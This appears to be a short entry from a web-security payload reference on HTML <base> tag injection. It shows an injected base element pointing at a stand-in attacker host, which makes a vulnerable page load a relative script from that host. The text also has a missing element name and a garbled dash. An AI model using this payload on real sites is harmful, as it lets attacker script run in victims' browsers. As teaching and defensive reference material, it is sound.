# base

The HTML 
 element specifies the base URL to use for all relative URLs in a document.
Note: If multiple <base> elements are used, only the first href and first target are obeyed â€” all others are ignored.

## Relative URL redirection
`<base>` tag injection allows you to redirect relative url to the attacker host. For example, if the vulnerable site includes a script:
```html
<script src="/assets/some-script.js"></script>
```

so, if you inject before the relative remote script:
```html
<base href="https://attacker-website.com">
```
the browser will request https://attacker-website.com/assets/some-script.js.
